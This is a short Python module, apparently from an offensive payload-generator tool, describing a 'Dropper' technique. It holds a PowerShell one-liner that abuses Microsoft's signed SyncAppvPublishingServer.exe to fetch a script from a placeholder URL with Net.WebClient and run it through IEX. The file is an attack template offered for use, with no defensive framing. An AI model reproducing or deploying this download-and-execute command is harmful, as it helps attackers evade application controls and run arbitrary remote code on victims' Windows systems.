class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Using Microsoft's SyncAppvPublishingServer to download and execute a PowerShell file!"
    function    = "Dropper"
    liner     = """SyncAppvPublishingServer.exe "n;((New-Object Net.WebClient).DownloadString('URL') | IEX"""
